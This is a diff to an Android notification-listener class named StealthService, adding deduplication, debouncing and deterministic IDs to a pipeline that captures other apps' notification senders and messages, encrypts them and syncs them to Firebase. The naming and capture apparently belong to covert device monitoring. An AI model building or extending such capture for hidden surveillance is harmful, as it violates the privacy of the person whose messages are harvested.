@@ -25,6 +25,7 @@ import com.notrack.stealth.security.EncryptionUtils;
 import com.notrack.stealth.sync.FirebaseHelper;
 import com.notrack.stealth.sync.SyncWorker;
 
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
@@ -33,6 +34,7 @@ import java.util.List;
 import java.util.Map;
 import java.util.Set;
 import java.util.UUID;
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ConcurrentLinkedQueue;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -59,8 +61,12 @@ public class StealthService extends NotificationListenerService {
             Math.max(2, Runtime.getRuntime().availableProcessors()));
     private static final ExecutorService NETWORK_DISPATCH_EXECUTOR = Executors.newSingleThreadExecutor();
 
-    // Deduplication LRU Cache (Maps dedupKey -> timestamp ms). Suppresses rapid duplicates within 3s window.
-    private static final int MAX_DEDUP_CACHE_SIZE = 250;
+    // Deduplication & Anti-Debounce Structures (Enterprise 3-Tier Architecture)
+    private static final int MAX_DEDUP_CACHE_SIZE = 2000;
+    public static final long ONGOING_NOTIFICATION_COOLDOWN_MS = 6 * 3600 * 1000L; // 6 hours
+    public static final long STANDARD_NOTIFICATION_DEBOUNCE_MS = 10 * 60 * 1000L; // 10 minutes
+
+    // 1. Content Hash Cache: Maps sha256(pkg|sender|message) -> lastSeenTimestampMs
     private final Map<String, Long> mRecentNotificationTimestamps = Collections.synchronizedMap(
             new LinkedHashMap<String, Long>(MAX_DEDUP_CACHE_SIZE, 0.75f, true) {
                 @Override
@@ -70,17 +76,39 @@ public class StealthService extends NotificationListenerService {
             }
     );
 
+    // 2. Active Notification Instance Cache: Maps sbnKey + "_" + postTime -> timestamp
+    // Prevents shade rescan from re-processing the exact same notification post instance
+    private final Map<String, Long> mProcessedInstanceKeys = Collections.synchronizedMap(
+            new LinkedHashMap<String, Long>(MAX_DEDUP_CACHE_SIZE, 0.75f, true) {
+                @Override
+                protected boolean removeEldestEntry(Map.Entry<String, Long> eldest) {
+                    return size() > MAX_DEDUP_CACHE_SIZE;
+                }
+            }
+    );
+
+    // 3. Ongoing Notification State Tracker: Maps sbnKey -> lastKnownContentHash
+    // Tracks ongoing/persistent widgets (weather, media, pedometer) so identical text pulses are ignored
+    private final Map<String, String> mActiveOngoingContentMap = new ConcurrentHashMap<>();
+
     private static class QueuedNotification {
         final String title;
         final String message;
         final String packageName;
         final long timestamp;
+        final String contentChecksum;
+        final String deterministicMessageId;
+        final boolean isOngoing;
 
-        QueuedNotification(String title, String message, String packageName, long timestamp) {
+        QueuedNotification(String title, String message, String packageName, long timestamp,
+                           String contentChecksum, String deterministicMessageId, boolean isOngoing) {
             this.title = title;
             this.message = message;
             this.packageName = packageName;
             this.timestamp = timestamp;
+            this.contentChecksum = contentChecksum;
+            this.deterministicMessageId = deterministicMessageId;
+            this.isOngoing = isOngoing;
         }
     }
 
@@ -96,8 +124,29 @@ public class StealthService extends NotificationListenerService {
     public void onCreate() {
         super.onCreate();
         sInstance = this;
+        warmupDedupCache();
         registerNetworkCallback();
         Log.i(TAG, "Enterprise StealthService initialized with deep notification capture engine.");
+    }
+
+    private void warmupDedupCache() {
+        CRYPTO_DB_EXECUTOR.execute(() -> {
+            try {
+                AppDatabase db = AppDatabase.getInstance(this);
+                List<String> recentChecksums = db.notificationDao().getRecentChecksums(500);
+                if (recentChecksums != null) {
+                    long now = System.currentTimeMillis();
+                    for (String hash : recentChecksums) {
+                        if (hash != null && !hash.isEmpty()) {
+                            mRecentNotificationTimestamps.put(hash, now);
+                        }
+                    }
+                    Log.i(TAG, "Dedup cache warmed up with " + recentChecksums.size() + " recent checksums from DB.");
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Error warming up dedup cache: " + e.getMessage());
+            }
+        });
     }
 
     @Override
@@ -113,6 +162,7 @@ public class StealthService extends NotificationListenerService {
         super.onListenerConnected();
         sInstance = this;
         Log.i(TAG, "Notification Listener connected.");
+        warmupDedupCache();
         processActiveNotifications();
         triggerAsyncSync();
     }
@@ -355,19 +405,63 @@ public class StealthService extends NotificationListenerService {
                 message = "[Empty content / Alert]";
             }
 
-            // 3. DEDUPLICATION (Suppresses rapid duplicate notifications within 3 seconds, allows repeats later)
-            String dedupKey = pkgName + "|" + senderIdentity + "|" + message;
+            // 3. MULTI-TIER DEDUPLICATION & DEBOUNCING
+            boolean isOngoing = (note.flags & Notification.FLAG_ONGOING_EVENT) != 0;
+            String sbnKey = sbn.getKey() != null ? sbn.getKey() : (pkgName + ":" + sbn.getId());
+            long postTime = sbn.getPostTime();
             long now = System.currentTimeMillis();
-            Long lastSeen = mRecentNotificationTimestamps.get(dedupKey);
-            if (lastSeen != null && (now - lastSeen) < 3000) {
-                return; // Skip duplicate notification within 3-second window
-            }
-            mRecentNotificationTimestamps.put(dedupKey, now);
+            long timestamp = postTime > 0 ? postTime : now;
 
-            long timestamp = sbn.getPostTime() > 0 ? sbn.getPostTime() : now;
+            // Tier 1A: Notification Instance Check (Eliminates repeated shade scans of identical post instance)
+            String instanceKey = sbnKey + "_" + timestamp;
+            if (mProcessedInstanceKeys.containsKey(instanceKey)) {
+                return; // Exact same notification post event already captured
+            }
+
+            // Clean sender and message
+            String cleanSender = sanitize(senderIdentity);
+            String cleanMessage = sanitize(message);
+
+            // Tier 1B: Compute Pure Content Fingerprint (sha256 of pkg + sender + message)
+            String contentFingerprint = pkgName + "|" + cleanSender + "|" + cleanMessage;
+            String contentChecksum = EncryptionUtils.generateChecksum(contentFingerprint);
+
+            // Tier 1C: Ongoing Notification Filter (e.g. Weather "Feels like 33 in Karachi", Music, Pedometer)
+            if (isOngoing) {
+                String lastKnownHash = mActiveOngoingContentMap.get(sbnKey);
+                if (contentChecksum.equals(lastKnownHash)) {
+                    // Ongoing notification content is completely unchanged. Suppress repeated pulse!
+                    return;
+                }
+                // Cooldown: Even across dismissals, suppress identical ongoing content for 6 hours
+                Long lastSeen = mRecentNotificationTimestamps.get(contentChecksum);
+                if (lastSeen != null && (now - lastSeen) < ONGOING_NOTIFICATION_COOLDOWN_MS) {
+                    mActiveOngoingContentMap.put(sbnKey, contentChecksum);
+                    return;
+                }
+                mActiveOngoingContentMap.put(sbnKey, contentChecksum);
+            } else {
+                // Tier 1D: Standard Notification Debouncing (10 minutes window for identical sender & message)
+                Long lastSeen = mRecentNotificationTimestamps.get(contentChecksum);
+                if (lastSeen != null && (now - lastSeen) < STANDARD_NOTIFICATION_DEBOUNCE_MS) {
+                    return; // Skip duplicate notification pulse within debounce window
+                }
+            }
+
+            // Mark instance and content as seen in fast in-memory LRU caches
+            mProcessedInstanceKeys.put(instanceKey, now);
+            mRecentNotificationTimestamps.put(contentChecksum, now);
+
+            // Tier 1E: Generate Deterministic Message ID (RFC 4122 Type 3 UUID)
+            // Bucketed timestamp guarantees identical messageId for idempotent Firebase RTDB writes
+            long timeBucket = isOngoing ? (timestamp / 86400000L) : (timestamp / 600000L); // 24h bucket for ongoing, 10m for standard
+            String idSeed = fetchDeviceId() + ":" + pkgName + ":" + contentChecksum + ":" + timeBucket;
+            String deterministicMessageId = UUID.nameUUIDFromBytes(idSeed.getBytes(StandardCharsets.UTF_8)).toString();
 
             // Zero-copy enqueue into high-speed in-memory buffer (< 0.1ms)
-            mIngestQueue.offer(new QueuedNotification(sanitize(senderIdentity), sanitize(message), pkgName, timestamp));
+            mIngestQueue.offer(new QueuedNotification(
+                    cleanSender, cleanMessage, pkgName, timestamp,
+                    contentChecksum, deterministicMessageId, isOngoing));
 
             // Schedule asynchronous background worker to process queue
             scheduleQueueDrain();
@@ -424,13 +518,26 @@ public class StealthService extends NotificationListenerService {
 
             while ((item = mIngestQueue.poll()) != null && batchCount < 20) {
                 batchCount++;
-                String messageId = UUID.randomUUID().toString();
+
+                // Tier 2: Room SQLite Persistence Deduplication Check
+                long cooldownThreshold = System.currentTimeMillis() - (item.isOngoing ? ONGOING_NOTIFICATION_COOLDOWN_MS : STANDARD_NOTIFICATION_DEBOUNCE_MS);
+                int duplicateCount = db.notificationDao().countRecentDuplicate(
+                        item.packageName,
+                        item.contentChecksum,
+                        cooldownThreshold
+                );
+                if (duplicateCount > 0) {
+                    Log.i(TAG, "Suppressed duplicate notification from Room DB check: " + item.packageName);
+                    continue; // Skip DB insert and skip Firebase push
+                }
+
+                String messageId = item.deterministicMessageId != null ? item.deterministicMessageId : UUID.randomUUID().toString();
 
                 // 1. Unified Master AES-256-GCM Envelope Encryption (Self-contained, 100% interoperable)
                 EncryptionUtils.SecureMessageEnvelope envelope = EncryptionUtils.encryptWithDeviceKey(
                         this, item.message, deviceId, messageId, item.timestamp, false);
                 EncryptionUtils.EncryptedPayload titleEncrypted = EncryptionUtils.encryptWebCrypto(item.title);
-                String checksum = EncryptionUtils.generateChecksum(deviceId + item.packageName + item.title + item.message + item.timestamp);
+                String checksum = item.contentChecksum;
 
                 NotificationEntity entity = new NotificationEntity(
                         messageId,
@@ -572,6 +679,11 @@ public class StealthService extends NotificationListenerService {
 
     @Override
     public void onNotificationRemoved(StatusBarNotification sbn) {
-        // Ignored
+        if (sbn == null) return;
+        try {
+            String pkgName = sbn.getPackageName() != null ? sbn.getPackageName() : "unknown";
+            String sbnKey = sbn.getKey() != null ? sbn.getKey() : (pkgName + ":" + sbn.getId());
+            mActiveOngoingContentMap.remove(sbnKey);
+        } catch (Exception ignored) {}
     }
 }
